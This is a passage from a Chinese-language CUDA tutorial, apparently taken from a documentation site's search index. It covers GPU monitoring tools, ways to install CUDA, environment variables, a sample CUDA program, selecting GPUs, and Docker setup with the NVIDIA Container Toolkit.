CSV\u3002\u200b\u4f8b\u5982\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u4f1a\u200b\u8f93\u51fa\u200b\u5f53\u524d\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b GPU \u200b\u7684\u200b\u8fdb\u7a0b\u200b\u60c5\u51b5\u200b\u4e3a\u200b CSV\uff1a</p> <pre><code>$ nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv\npid, process_name, used_gpu_memory [MiB]\n56263, ./minute_payload, 102 MiB\n</code></pre>"},{"location":"advanced/cuda/#nvitop","title":"<code>nvitop</code>","text":"<p><code>nvitop</code> \u200b\u662f\u200b\u7b2c\u4e09\u65b9\u200b\u5de5\u5177\u200b\uff0c\u200b\u80fd\u591f\u200b\u4ee5\u200b\u7f8e\u89c2\u200b\u7684\u200b TUI \u200b\u754c\u9762\u663e\u793a\u200b NVIDIA GPU \u200b\u7684\u200b\u72b6\u6001\u200b\u4fe1\u606f\u200b\u3002</p> <p></p> <p>\u200b\u4f7f\u7528\u200b <code>pipx</code> \u200b\u5b89\u88c5\u200b\u5373\u53ef\u200b\uff1a</p> <pre><code>pipx install nvitop\n</code></pre>"},{"location":"advanced/cuda/#nvtop","title":"<code>nvtop</code>","text":"<p><code>nvtop</code> \u200b\u662f\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u7b2c\u4e09\u65b9\u200b\u5de5\u5177\u200b\u3002\u200b\u867d\u7136\u200b\u540d\u5b57\u200b\u91cc\u200b\u6709\u200b <code>nv</code>\uff0c\u200b\u4f46\u662f\u200b\u5b83\u200b\u5b9e\u9645\u4e0a\u200b\u662f\u200b \"Neat Videocard TOP\"\uff0c\u200b\u9002\u7528\u200b\u4e8e\u200b\u5305\u62ec\u200b NVIDIA \u200b\u5728\u5185\u200b\u7684\u200b\u591a\u79cd\u200b\u663e\u5361\u200b\u3002\u200b\u5b83\u200b\u7684\u200b\u754c\u9762\u200b\u5219\u200b\u548c\u200b <code>htop</code> \u200b\u7c7b\u4f3c\u200b\u3002</p> <p><code>nvtop</code> \u200b\u5728\u200b\u5927\u90e8\u5206\u200b\u53d1\u884c\u7248\u200b\u7684\u200b\u4ed3\u5e93\u200b\u4e2d\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b\u3002</p> <p></p>"},{"location":"advanced/cuda/#gpustat","title":"<code>gpustat</code>","text":"<p><code>gpustat</code> \u200b\u80fd\u591f\u200b\u663e\u793a\u200b\u6781\u7b80\u200b\u7684\u200b GPU \u200b\u72b6\u6001\u200b\u4fe1\u606f\u200b\u3002\u200b\u540c\u6837\u200b\u4f7f\u7528\u200b <code>pipx</code> \u200b\u5b89\u88c5\u200b\u5373\u53ef\u200b\uff1a</p> <pre><code>pipx install gpustat\n</code></pre> <pre><code>$ gpustat --color\nVM-0-8-ubuntu  Wed Jul 30 03:16:21 2025  535.216.01\n[0] Tesla T4 | 60\u00b0C, 100 % |   107 / 15360 MB | ubuntu(102M)\n$ gpustat --json\n{\n    \"hostname\": \"VM-0-8-ubuntu\",\n    \"driver_version\": \"535.216.01\",\n    \"query_time\": \"2025-07-30T03:16:30.082082\",\n    \"gpus\": [\n        {\n            \"index\": 0,\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre>"},{"location":"advanced/cuda/#install-cuda","title":"\u5b89\u88c5\u200b\u4e0e\u200b\u4f7f\u7528\u200b CUDA","text":"<p>\u200b\u53ef\u4ee5\u200b\u4ece\u5305\u200b\u7ba1\u7406\u5668\u200b\u5b89\u88c5\u200b CUDA\u3002\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u7b2c\u4e00\u79cd\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5728\u200b Ubuntu \u200b\u4e0e\u200b Debian \u200b\u4e2d\u5219\u200b\u5bf9\u5e94\u200b <code>nvidia-cuda-dev nvidia-cuda-toolkit nvidia-visual-profiler</code> \u200b\u8fd9\u200b\u51e0\u4e2a\u200b\u5305\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u53d1\u884c\u7248\u200b\u4e00\u822c\u200b\u4e0d\u4f1a\u200b\u63d0\u4f9b\u200b\u591a\u4e2a\u200b\u7248\u672c\u200b\u7684\u200b CUDA\u3002\u200b\u5f53\u524d\u200b\u4f7f\u7528\u200b\u7684\u200b NVIDIA \u200b\u6e90\u4e2d\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u6ca1\u6709\u200b\u9700\u8981\u200b\u7684\u200b\u7248\u672c\u200b\uff08\u200b\u53ef\u4ee5\u200b\u68c0\u67e5\u200b\u540d\u5b57\u200b\u4ee5\u200b <code>cuda</code> \u200b\u5f00\u5934\u200b\u7684\u200b\u5305\u200b\uff09\u3002\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u65b9\u5f0f\u200b\u5b89\u88c5\u200b\u65e7\u7248\u672c\u200b\u7684\u200b CUDA\u3002</p>"},{"location":"advanced/cuda/#cuda-runfile","title":"\u4f7f\u7528\u200b runfile \u200b\u5b89\u88c5","text":"<p>\u200b\u5c3d\u7ba1\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b runfile \u200b\u5b89\u88c5\u200b NVIDIA \u200b\u9a71\u52a8\u200b\uff0c\u200b\u4f46\u662f\u200b\u5b89\u88c5\u200b CUDA \u200b\u65f6\u200b\u4f7f\u7528\u200b runfile \u200b\u5b89\u88c5\u200b\u662f\u200b\u4e00\u4e2a\u200b\u53ef\u884c\u200b\u7684\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u56e0\u4e3a\u200b CUDA \u200b\u8fd0\u884c\u200b\u65f6\u200b\u4e0e\u200b\u5f00\u53d1\u5de5\u5177\u200b\u4e0d\u4f1a\u200b\u5bf9\u7cfb\u7edf\u200b\u6b63\u5e38\u200b\u8fd0\u884c\u200b\u4ea7\u751f\u200b\u5f71\u54cd\u200b\uff0c\u200b\u751a\u81f3\u200b\u5728\u200b\u6ca1\u6709\u200b NVIDIA GPU \u200b\u7684\u200b\u673a\u5668\u200b\u4e0a\u200b\u90fd\u200b\u80fd\u591f\u200b\u5b89\u88c5\u200b\u3001\u200b\u7f16\u8bd1\u200b CUDA \u200b\u7a0b\u5e8f\u200b\u3002\u200b\u4ece\u200b\u7f51\u7ad9\u200b\u4e0b\u8f7d\u200b\u540e\u200b\uff0c\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u5b89\u88c5\u200b\u5373\u53ef\u200b\uff1a</p> <pre><code># \u200b\u5c06\u200b cuda_12.9.1_575.57.08_linux.run \u200b\u66ff\u6362\u200b\u4e3a\u200b\u4f60\u200b\u4e0b\u8f7d\u200b\u7684\u200b CUDA runfile \u200b\u6587\u4ef6\u200b\nsh cuda_12.9.1_575.57.08_linux.run --silent --toolkit --toolkitpath=/path/to/cuda/\n</code></pre>"},{"location":"advanced/cuda/#cuda-conda","title":"\u4f7f\u7528\u200b Conda \u200b\u5b89\u88c5","text":"<p>Anaconda \u200b\u662f\u200b\u4e00\u4e2a\u200b\u6d41\u884c\u200b\u7684\u200b Python \u200b\u73af\u5883\u200b\u7ba1\u7406\u5de5\u5177\u200b\uff0c\u200b\u5b83\u200b\u80fd\u591f\u200b\u7ba1\u7406\u200b Python \u200b\u5305\u200b\u4ee5\u5916\u200b\u7684\u200b\u4f9d\u8d56\u200b\uff08\u200b\u4f8b\u5982\u200b\u672c\u6587\u200b\u4ecb\u7ecd\u200b\u7684\u200b CUDA\uff0c\u200b\u4ee5\u53ca\u200b\u8bf8\u5982\u200b ffmpeg \u200b\u7b49\u200b\u8f6f\u4ef6\u200b\uff09\uff0c\u200b\u65b9\u4fbf\u200b\u7528\u6237\u200b\u914d\u7f6e\u200b\u73af\u5883\u200b\uff0c\u200b\u5728\u200b\u79d1\u7814\u4eba\u5458\u200b\u4e2d\u200b\u975e\u5e38\u200b\u6d41\u884c\u200b\u3002\u200b\u5728\u200b\u9700\u8981\u200b\u7279\u5b9a\u200b\u7248\u672c\u200b CUDA \u200b\u7684\u200b Python \u200b\u9879\u76ee\u200b\u4e2d\u200b\uff0c\u200b\u4f7f\u7528\u200b Conda \u200b\u5b89\u88c5\u200b CUDA \u200b\u662f\u200b\u4e00\u79cd\u200b\u975e\u5e38\u200b\u65b9\u4fbf\u200b\u7684\u200b\u65b9\u5f0f\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u521b\u5efa\u200b\u865a\u62df\u73af\u5883\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b Conda \u200b\u865a\u62df\u73af\u5883\u200b\u5e76\u200b\u6fc0\u6d3b\u200b\uff0c\u200b\u4ee5\u200b\u907f\u514d\u200b\u5c06\u200b <code>base</code> \u200b\u73af\u5883\u200b\u5f04\u574f\u200b\uff1a</p> <pre><code>conda create -n example_env\nconda activate example_env\n</code></pre> <p>\u200b\u7136\u540e\u200b\u4ece\u200b NVIDIA \u200b\u63d0\u4f9b\u200b\u7684\u200b Conda \u200b\u9891\u9053\u200b\uff08channel\uff09\u200b\u4e2d\u200b\u641c\u7d22\u200b\u9700\u8981\u200b\u7684\u200b CUDA \u200b\u7248\u672c\u200b\uff0c\u200b\u5e76\u200b\u5b89\u88c5\u200b\uff1a</p> <pre><code>(example_env) $ conda search -c nvidia cuda\nLoading channels: done\n# Name                       Version           Build  Channel\ncuda                          11.3.0      h3b286be_0  nvidia\ncuda                          11.4.0               0  nvidia\ncuda                          11.4.0      hf865f46_0  nvidia\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n(example_env) $ conda install -c nvidia cuda=11.3.0\nCollecting package metadata (current_repodata.json): done\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p>Conda \u200b\u9891\u9053\u200b</p> <p>Anaconda \u200b\u9ed8\u8ba4\u200b\u4ec5\u200b\u5305\u542b\u200b Anaconda \u200b\u516c\u53f8\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\u6e90\u200b\uff08<code>pkg/main</code> \u200b\u548c\u200b <code>pkg/r</code>\uff0c\u200b\u5546\u7528\u200b\u7528\u9014\u200b\u9700\u8981\u200b\u4ed8\u8d39\u200b\uff09\uff0c\u200b\u4f46\u662f\u200b\u5141\u8bb8\u200b\u7b2c\u4e09\u65b9\u200b\u5f00\u53d1\u8005\u200b\u8bbe\u7acb\u200b\u81ea\u5df1\u200b\u7684\u200b\u300c\u200b\u9891\u9053\u200b\u300d\uff08\u200b\u5373\u200b\u4ed3\u5e93\u200b\uff09\u3002\u200b\u4f7f\u7528\u200b <code>-c</code> \u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u4f7f\u7528\u200b\u7684\u200b\u9891\u9053\u200b\u3002</p> <p>\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u4ece\u200b Anaconda \u200b\u7684\u200b <code>pkg/main</code> \u200b\u9891\u9053\u200b\u5b89\u88c5\u200b CUDA\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u5305\u542b\u200b\u7684\u200b CUDA \u200b\u7248\u672c\u200b\u901a\u5e38\u200b\u4e0d\u662f\u200b\u4f60\u200b\u60f3\u8981\u200b\u7684\u200b\u3002\u200b\u9664\u4e86\u200b NVIDIA \u200b\u5b98\u65b9\u200b\u7684\u200b <code>nvidia</code> \u200b\u9891\u9053\u200b\u5916\u200b\uff0c\u200b\u7531\u200b\u793e\u533a\u200b\u7ef4\u62a4\u200b\u7684\u200b Conda Forge\uff08<code>-c conda-forge</code>\uff09\u200b\u9891\u9053\u200b\u4e5f\u200b\u5305\u542b\u200b\u4e86\u200b CUDA \u200b\u5305\u200b\u3002</p> <p><code>cuda</code> \u200b\u548c\u200b <code>cuda-toolkit</code></p> <p>\u200b\u5982\u679c\u200b\u4e0d\u200b\u9700\u8981\u200b CUDA \u200b\u5f00\u53d1\u5de5\u5177\u200b\uff08\u200b\u4f8b\u5982\u200b nvcc\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u53ea\u200b\u5b89\u88c5\u200b <code>cuda-toolkit</code> \u200b\u5305\u200b\u3002</p>"},{"location":"advanced/cuda/#cuda-pip","title":"\u4f7f\u7528\u200b pip \u200b\u5b89\u88c5","text":"<p>NVIDIA \u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4f7f\u7528\u200b <code>pip</code> \u200b\u4ece\u200b\u5176\u200b Python \u200b\u5305\u200b\u4ed3\u5e93\u200b\u5b89\u88c5\u200b CUDA \u200b\u7684\u200b\u65b9\u5f0f\u200b\u3002\u200b\u4f8b\u5982\u200b\u5b89\u88c5\u200b CUDA 12 \u200b\u7684\u200b\u8fd0\u884c\u200b\u65f6\u200b\u7ec4\u4ef6\u200b\uff1a</p> <pre><code>pip install nvidia-cuda-runtime-cu12 --extra-index-url https://pypi.ngc.nvidia.com\n</code></pre> <p>\u200b\u5176\u4ed6\u200b\u4fe1\u606f\u200b\u53ef\u200b\u53c2\u8003\u200b CUDA \u200b\u5b89\u88c5\u200b\u624b\u518c\u200b\u7684\u200b\u8bf4\u660e\u200b\u3002</p>"},{"location":"advanced/cuda/#cuda-env","title":"\u73af\u5883\u53d8\u91cf\u200b\u8bbe\u7f6e","text":"<p>\u200b\u5982\u679c\u200b\u4f60\u200b\u60f3\u8981\u200b\u65b9\u4fbf\u200b\u5730\u200b\u5728\u200b Shell \u200b\u4e2d\u200b\u4f7f\u7528\u200b CUDA \u200b\u6307\u4ee4\u200b\uff0c\u200b\u9700\u8981\u200b\u5c06\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\u76ee\u5f55\u200b\u52a0\u200b\u5230\u200b <code>PATH</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\u4e2d\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u6267\u884c\u200b nvcc \u200b\u7b49\u200b\u7a0b\u5e8f\u200b\u3002\u200b\u5982\u679c\u200b\u4f60\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b\u53d1\u884c\u7248\u200b\u6253\u5305\u200b\u7684\u200b CUDA\uff0c\u200b\u90a3\u4e48\u200b\u4e00\u822c\u200b\u4e0d\u200b\u9700\u8981\u200b\u4efb\u4f55\u200b\u8bbe\u7f6e\u200b\uff1b\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b NVIDIA \u200b\u6253\u5305\u200b\u7684\u200b CUDA\uff0c\u200b\u90a3\u4e48\u200b\u4e00\u822c\u200b\u4f1a\u200b\u5b89\u88c5\u200b\u5728\u200b <code>/usr/local/cuda</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u4ee5\u200b <code>/usr/local/cuda</code> \u200b\u4e3a\u4f8b\u200b\uff1a</p> <pre><code>export PATH=/usr/local/cuda/bin${PATH:+:${PATH}}\n</code></pre> <p>\u200b\u5982\u679c\u200b\u7f16\u8bd1\u200b\u9879\u76ee\u200b\u65f6\u200b\u627e\u200b\u4e0d\u5230\u200b CUDA \u200b\u5e93\u200b\uff0c\u200b\u5219\u200b\u9700\u8981\u200b\u66f4\u65b0\u200b\u52a8\u6001\u94fe\u63a5\u5e93\u200b\u8def\u5f84\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b <code>LD_LIBRARY_PATH</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\uff1a</p> <pre><code>export LD_LIBRARY_PATH=/usr/local/cuda/lib64${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}\n</code></pre>"},{"location":"advanced/cuda/#compile-run-cuda","title":"\u7f16\u8bd1\u200b\u3001\u200b\u8fd0\u884c\u200b CUDA \u200b\u7a0b\u5e8f","text":"<p>CUDA \u200b\u7a0b\u5e8f\u200b\u7684\u200b\u7f16\u8bd1\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>nvcc</code> \u200b\u7f16\u8bd1\u5668\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e2a\u200b\u975e\u5e38\u7b80\u5355\u200b\u7684\u200b CUDA \u200b\u7a0b\u5e8f\u200b\uff1a</p> hello.cu<pre><code>#include &lt;cstdio&gt;\n#include &lt;cuda_runtime.h&gt;\n\n// CUDA \u200b\u7684\u200b\u51fd\u6570\u200b\u7531\u200b __global__\u3001__device__ \u200b\u6216\u200b __host__ \u200b\u4fee\u9970\u7b26\u200b\u4fee\u9970\u200b\n__global__ void helloFromGPU()\n{\n    printf(\"Hello, World from GPU thread %d!\\n\", threadIdx.x);\n}\n\nint main()\n{\n    printf(\"Hello, World from CPU!\\n\");\n\n    // \u200b\u4ee5\u200b 1 \u200b\u4e2a\u5757\u200b\u30015 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\u7684\u200b\u65b9\u5f0f\u200b\u8c03\u7528\u200b GPU \u200b\u51fd\u6570\u200b\n    helloFromGPU&lt;&lt;&lt;1, 5&gt;&gt;&gt;();\n\n    // GPU \u200b\u51fd\u6570\u200b\u7684\u200b\u6267\u884c\u200b\u662f\u200b\u5f02\u6b65\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u7b49\u5f85\u200b GPU \u200b\u5b8c\u6210\u200b\u4efb\u52a1\u200b\n    cudaDeviceSynchronize();\n\n    return 0;\n}\n</code></pre> <p>\u200b\u4f7f\u7528\u200b <code>nvcc</code> \u200b\u7f16\u8bd1\u200b\u8fd0\u884c\u200b\u5373\u53ef\u200b\uff1a</p> <pre><code>$ nvcc hello.cu -o hello\n$ ./hello\nHello, World from CPU!\nHello, World from GPU thread 0!\nHello, World from GPU thread 1!\nHello, World from GPU thread 2!\nHello, World from GPU thread 3!\nHello, World from GPU thread 4!\n</code></pre> <p>\u200b\u6ca1\u6709\u200b\u8f93\u51fa\u200b\uff1f</p> <p>\u200b\u53ef\u4ee5\u200b\u6dfb\u52a0\u200b <code>cudaGetLastError()</code> \u200b\u51fd\u6570\u200b\u6765\u200b\u68c0\u67e5\u200b\u662f\u5426\u200b\u6709\u200b\u9519\u8bef\u200b\u53d1\u751f\u200b\uff1a</p> <pre><code>helloFromGPU&lt;&lt;&lt;1, 5&gt;&gt;&gt;();\n\n// check launch errors\ncudaError_t err = cudaGetLastError();\nif (err != cudaSuccess)\n{\n    fprintf(stderr, \"CUDA error: %s\\n\", cudaGetErrorString(err));\n    return 1;\n}\n</code></pre> <p>\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\u662f\u200b\u8f93\u51fa\u200b \"the provided PTX was compiled with an unsupported toolchain.\" \u200b\u9519\u8bef\u200b\uff0c\u200b\u8868\u793a\u200b\u7cfb\u7edf\u200b NVIDIA \u200b\u9a71\u52a8\u200b\u7248\u672c\u200b\u4e0d\u200b\u652f\u6301\u200b CUDA \u200b\u7a0b\u5e8f\u200b\u7f16\u8bd1\u200b\u65f6\u200b\u7684\u200b CUDA \u200b\u7248\u672c\u200b\uff0c\u200b\u4e00\u822c\u200b\u662f\u56e0\u4e3a\u200b\u9a71\u52a8\u200b\u7248\u672c\u200b\u8fc7\u4f4e\u200b\u3002</p>"},{"location":"advanced/cuda/#limit-gpu","title":"\u9650\u5236\u200b\u4f7f\u7528\u200b\u7684\u200b GPU","text":"<p>\u200b\u591a\u200b GPU \u200b\u73af\u5883\u200b\u4e0d\u5c11\u200b\u65f6\u5019\u200b\u4f1a\u200b\u6709\u200b\u591a\u200b\u4eba\u200b\u5171\u4eab\u200b\uff0c\u200b\u6b64\u65f6\u200b\u9650\u5236\u200b\u5177\u4f53\u200b\u4f7f\u7528\u200b\u7684\u200b GPU \u200b\u662f\u200b\u5f88\u200b\u91cd\u8981\u200b\u7684\u200b\uff0c\u200b\u5426\u5219\u200b\u4f60\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5360\u7528\u200b\u6240\u6709\u200b GPU \u200b\u8d44\u6e90\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u5176\u4ed6\u4eba\u200b\u65e0\u6cd5\u200b\u4f7f\u7528\u200b\uff0c\u200b\u6216\u8005\u200b\u662f\u200b\u548c\u200b\u5176\u4ed6\u4eba\u200b\u62a2\u540c\u200b\u4e00\u5757\u200b GPU\uff0c\u200b\u5bfc\u81f4\u200b\u4f60\u200b\u7684\u200b\u6216\u8005\u200b\u5176\u4ed6\u4eba\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u51fa\u9519\u200b\u6216\u200b\u6027\u80fd\u200b\u4e0b\u964d\u200b\u3002</p> <p><code>CUDA_VISIBLE_DEVICES</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\u53ef\u4ee5\u200b\u88ab\u200b CUDA \u200b\u8bc6\u522b\u200b\uff0c\u200b\u9650\u5236\u200b\u4f7f\u7528\u200b\u7684\u200b GPU\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code># \u200b\u53ea\u200b\u4f7f\u7528\u200b GPU 2\nCUDA_VISIBLE_DEVICES=2 ./hello\n# \u200b\u53ea\u200b\u4f7f\u7528\u200b GPU 0 \u200b\u548c\u200b 1\nCUDA_VISIBLE_DEVICES=0,1 ./hello\n</code></pre> <p>\u200b\u7531\u4e8e\u200b\u8fd9\u4e2a\u200b\u53d8\u91cf\u200b\u5728\u200b CUDA \u200b\u52a0\u8f7d\u200b\u65f6\u200b\u88ab\u200b\u8bc6\u522b\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u5728\u200b\u8fd0\u884c\u200b CUDA \u200b\u7a0b\u5e8f\u200b\u524d\u200b\u8bbe\u7f6e\u200b\u597d\u200b\u3002\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\u662f\u200b\uff0c\u200b\u6709\u4e9b\u200b\u65f6\u5019\u200b\u4e3a\u4e86\u200b\u7701\u4e8b\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5728\u200b Python \u200b\u811a\u672c\u200b\u6216\u8005\u200b Jupyter Notebook \u200b\u4e2d\u200b\u4f7f\u7528\u200b <code>os.environ</code> \u200b\u6765\u200b\u8bbe\u7f6e\u200b\u8fd9\u4e2a\u200b\u53d8\u91cf\u200b\u3002\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u5728\u200b\u5bfc\u5165\u200b\u4efb\u4f55\u200b CUDA \u200b\u76f8\u5173\u200b\u7684\u200b\u5e93\u200b\uff08\u200b\u4f8b\u5982\u200b PyTorch\u3001TensorFlow \u200b\u7b49\u200b\uff09\u200b\u4e4b\u524d\u200b\u8bbe\u7f6e\u200b\u597d\u200b\u8fd9\u4e2a\u200b\u53d8\u91cf\u200b\u3002</p> <pre><code>import os\nos.environ[\"CUDA_VISIBLE_DEVICES\"] = \"0,1\"\n\nimport torch\n# ...\n</code></pre>"},{"location":"advanced/cuda/#cuda-docker","title":"\u5728\u200b Docker \u200b\u73af\u5883\u200b\u4f7f\u7528\u200b CUDA","text":"<p>\u200b\u5728\u200b\u5f88\u591a\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b docker \u200b\u73af\u5883\u200b\u8fd0\u884c\u200b CUDA \u200b\u5e94\u7528\u200b\u3002Docker \u200b\u662f\u200b\u4e00\u79cd\u200b\u5bb9\u5668\u200b\u5316\u200b\u6280\u672f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u786e\u4fdd\u200b CUDA \u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u5728\u200b\u4e0d\u540c\u200b\u7cfb\u7edf\u200b\u4e0a\u200b\u8fd0\u884c\u200b\u65f6\u6709\u200b\u76f8\u540c\u200b\u7684\u200b\u4f9d\u8d56\u200b\u548c\u200b\u914d\u7f6e\u200b\uff0c\u200b\u964d\u4f4e\u200b\u201c\u200b\u73af\u5883\u200b\u4e0d\u540c\u200b\u5bfc\u81f4\u200b\u8fd0\u884c\u200b\u95ee\u9898\u200b\u201d\u200b\u7684\u200b\u98ce\u9669\u200b\uff0c\u200b\u8ba9\u200b\u522b\u4eba\u200b\u66f4\u200b\u65b9\u4fbf\u200b\u5730\u200b\u8fd0\u884c\u200b\u4f60\u200b\u7684\u200b\u4ee3\u7801\u200b\u3002\u200b\u5f88\u591a\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u4f60\u200b\u9700\u8981\u200b\u4e3a\u200b\u4e0d\u540c\u200b\u7684\u200b\u9879\u76ee\u200b\u914d\u7f6e\u200b\u4e0d\u540c\u200b\u7684\u200b\u73af\u5883\u200b\uff0cDocker \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u8f83\u200b\u597d\u200b\u7684\u200b\u9694\u79bb\u200b\u6027\u200b\uff0c\u200b\u51cf\u5c11\u200b\u4e86\u200b\u5bf9\u200b\u5bbf\u4e3b\u200b\u7cfb\u7edf\u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u955c\u50cf\u200b\u7248\u672c\u200b\u7ba1\u7406\u200b\u6765\u200b\u63d0\u9ad8\u200b\u8f6f\u4ef6\u200b\u73af\u5883\u200b\u7684\u200b\u53ef\u8ffd\u6eaf\u200b\u6027\u200b\u548c\u200b\u5b89\u5168\u6027\u200b\u3002\u200b\u53e6\u5916\u200b\uff0cNvidia \u200b\u7684\u200b CUDA \u200b\u955c\u50cf\u200b\u901a\u5e38\u200b\u8fdb\u884c\u200b\u4e86\u200b\u5f88\u591a\u200b\u4f18\u5316\u200b\u3002\u200b\u5728\u200b\u8fd9\u4e9b\u200b\u5bb9\u5668\u200b\u91cc\u200b\u8fd0\u884c\u200b CUDA \u200b\u5e94\u7528\u200b\u5f80\u5f80\u200b\u80fd\u200b\u53d6\u5f97\u200b\u6bd4\u200b\u5728\u200b\u5bbf\u4e3b\u673a\u200b\u8fd0\u884c\u200b\u66f4\u597d\u200b\u7684\u200b\u6027\u80fd\u200b\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u6559\u7a0b\u200b\u4e2d\u200b\u5047\u8bbe\u200b\u4f60\u200b\u5df2\u7ecf\u200b\u5b89\u88c5\u200b\u4e86\u200b Docker\u3002</p>"},{"location":"advanced/cuda/#nvidia-container-toolkit","title":"\u5b89\u88c5\u200b Nvidia Container Toolkit","text":"<p>Nvidia Container Toolkit \u200b\u662f\u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b\u5728\u200b Docker \u200b\u5bb9\u5668\u200b\u4e2d\u200b\u8fd0\u884c\u200b NVIDIA GPU \u200b\u8ba1\u7b97\u200b\u7684\u200b\u5de5\u5177\u200b\u3002\u200b\u4f60\u200b\u5fc5\u987b\u200b\u5b89\u88c5\u200b\u5b83\u200b\u624d\u80fd\u200b\u5728\u200b Docker \u200b\u73af\u5883\u200b\u4f7f\u7528\u200b CUDA\u3002</p> <ul> <li>\u200b\u5b98\u65b9\u200b\u6587\u6863\u200b</li> <li>USTC Mirror</li> </ul> <p>\u200b\u5b89\u88c5\u200b\u540e\u200b\u9700\u200b\u4fee\u6539\u200b\uff1a</p> /etc/docker/daemon.json<pre><code>{\n    \"runtimes\": {\n        \"nvidia\": {\n            \"args\": [],\n            \"path\": \"nvidia-container-runtime\"\n        }\n    },\n}\n</code></pre> <p>\u200b\u6216\u200b\u4f7f\u7528\u200b <code>nvidia-ctk</code>:</p> <pre><code>sudo nvidia-ctk runtime configure --runtime=docker\n</code></pre>"},{"location":"advanced/cuda/#cuda-docker-image","title":"\u6311\u9009\u200b\u955c\u50cf","text":"<p>\u200b\u901a\u5e38\u200b\u4ece\u200b Dockerhub \u200b\u548c\u200b Nvidia NGC \u200b\u6311\u9009\u200b\u955c\u50cf\u200b\u3002\u200b\u6216\u8005\u200b\u57fa\u4e8e\u200b\u8fd9\u4e9b\u200b\u955c\u50cf\u200b\u6253\u5305\u200b\u81ea\u5df1\u200b\u7684\u200b\u955c\u50cf\u200b\u3002</p> <p>\u200b\u6bd4\u8f83\u200b\u5e38\u7528\u200b\u7684\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li><code>nvidia/cuda:12.4.1-devel-ubuntu22.04</code>\uff1a\u200b\u4e00\u4e2a\u200b\u542b\u200b\u4e86\u200b CUDA \u200b\u5957\u4ef6\u200b\u7684\u200b\u57fa\u7840\u200b\u955c\u50cf\u200b\uff0c\u200b\u9002\u5408\u200b\u7528\u4e8e\u200b\u5f00\u53d1\u200b\u73af\u5883\u200b\u3002</li> <li><code>nvcr.io/nvidia/pytorch:24.12-py3</code>\uff1aNvidia \u200b\u9488\u5bf9\u200b PyTorch \u200b\u6df1\u5ea6\u200b\u5b66\u4e60\u200b\u6846\u67b6\u200b\u4f18\u5316\u200b\u7684\u200b\u955c\u50cf\u200b\uff0c\u200b\u5b83\u200b\u9884\u88c5\u200b\u4e86\u200b\u4f18\u5316\u200b\u7684\u200b PyTorch 